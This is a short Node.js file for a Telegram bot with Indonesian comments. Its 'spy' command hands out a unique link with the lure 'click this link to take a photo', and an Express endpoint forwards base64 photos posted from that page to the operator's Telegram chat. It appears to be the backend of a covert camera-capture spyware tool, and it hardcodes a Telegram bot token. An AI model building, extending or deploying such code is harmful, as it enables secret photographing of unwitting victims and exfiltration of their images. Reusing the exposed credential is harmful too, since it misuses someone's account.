const { Telegraf } = require('telegraf');
const crypto = require('crypto');
const express = require('express');

const bot = new Telegraf('7666486780:AAHFXF-elXqS_-25F8tw9RAXSXSU2NdBl2A');
const app = express();
app.use(express.json());

const userLinks = {}; // Menyimpan hubungan antara ID unik dan user Telegram

// Admin menambahkan nomor ke dalam daftar
bot.command('spy', async (ctx) => {
  const userId = ctx.chat.id;
  const randomId = crypto.randomBytes(4).toString('hex'); // ID unik
  const link = `https://dexzutelegram.vercel.app/${randomId}`;

  userLinks[randomId] = userId; // Simpan hubungan ID unik dan user

  ctx.reply(`Halo! Klik link ini untuk mengambil foto: ${link}`);
});

// Endpoint untuk menerima foto dari halaman web
app.post('/upload/:id', (req, res) => {
  const randomId = req.params.id;
  const imgData = req.body.imgData;

  const userId = userLinks[randomId];
  if (userId) {
    bot.telegram.sendPhoto(userId, { source: Buffer.from(imgData, 'base64') });
    res.send('Foto berhasil dikirim ke Telegram!');
  } else {
    res.status(404).send('Link tidak valid!');
  }
});

// Export server sebagai handler untuk Vercel
module.exports = app;

// Jalankan bot
bot.launch();
